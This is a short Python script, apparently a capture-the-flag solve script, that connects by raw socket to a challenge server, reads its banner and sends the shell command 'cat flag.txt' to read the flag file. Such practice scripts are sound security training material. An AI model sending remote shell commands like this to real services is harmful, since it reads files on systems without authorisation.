import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('chals.cyberjousting.com', 1370))

print(s.recv(1024).decode())
s.sendall(b"cat flag.txt\n")
time.sleep(1)
print(s.recv(1024).decode())
